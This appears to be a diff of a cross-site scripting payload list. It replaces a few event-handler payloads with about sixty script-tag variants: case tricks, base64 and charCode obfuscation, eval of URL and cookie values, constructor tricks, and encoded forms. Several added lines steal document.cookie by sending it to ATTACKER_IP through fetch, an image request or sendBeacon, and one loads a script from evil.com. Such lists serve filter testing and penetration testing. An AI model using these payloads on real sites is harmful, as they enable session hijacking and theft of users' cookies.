@@ -1,13 +1,64 @@
 <script>alert(1)</script>
 <script>alert('XSS')</script>
-<script src=//attacker.com/xss.js></script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<body onload=alert(1)>
-<iframe src=javascript:alert(1)>
-<a href=javascript:alert(1)>click</a>
-<input onfocus=alert(1) autofocus>
-<details open ontoggle=alert(1)>
-<video src=x onerror=alert(1)>
-<audio src=x onerror=alert(1)>
-<marquee onstart=alert(1)>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<script src=//evil.com/x.js></script>
+<script src=data:,alert(1)></script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script type="text/javascript">alert(1)</script>
+<script language="javascript">alert(1)</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>window.onload=function(){alert(1)}</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',1)</script>
+<script>location='javascript:alert(1)'</script>
+<script>location.href='javascript:alert(1)'</script>
+<script>window.location='javascript:alert(1)'</script>
+<script>document.location='javascript:alert(1)'</script>
+<script>history.pushState({},'')<script>alert(1)</script>
+<script>fetch('http://ATTACKER_IP/?c='+document.cookie)</script>
+<script>new Image().src='http://ATTACKER_IP/?c='+document.cookie</script>
+<script>navigator.sendBeacon('http://ATTACKER_IP/',document.cookie)</script>
+<script>Function('alert(1)')()</script>
+<script>new Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>Object.constructor.constructor('alert(1)')()</script>
+<script>alert`1`</script>
+<script>alert(window.name)</script>
+<script>alert(location.hash.slice(1))</script>
+<script>alert(location.search.slice(1))</script>
+<script>alert(decodeURIComponent(location.hash))</script>
+<noscript><a href="javascript:alert(1)">click</a></noscript>
+<noscript><form action="javascript:alert(1)"><button></noscript>
+<script>eval(name)</script>
+<script>eval(location.hash.slice(1))</script>
+<script>eval(location.search)</script>
+<script>eval(document.cookie)</script>
+<script>eval(document.referrer)</script>
+<script src=x onerror=alert(1)>
+<script>a=alert;a(1)</script>
+<script>var a=alert;a(1)</script>
+<script>const a=alert;a(1)</script>
+<script>let a=alert;a(1)</script>
+<script>with(window)alert(1)</script>
+<script>with(document)write('<script>alert(1)<\/script>')</script>
+<script>(function(){alert(1)})()</script>
+<script>!function(){alert(1)}()</script>
+<script>+function(){alert(1)}()</script>
+<script>-function(){alert(1)}()</script>
+<script>~function(){alert(1)}()</script>
+<script>void function(){alert(1)}()</script>
+<script>delete function(){alert(1)}()</script>
+<script>typeof function(){alert(1)}()</script>
+<script>;(function(){alert(1)})()</script>
+<script>,function(){alert(1)}()</script>
+<script>import('data:text/javascript,alert(1)')</script>
+<script>import(`data:text/javascript,alert${1}`)</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
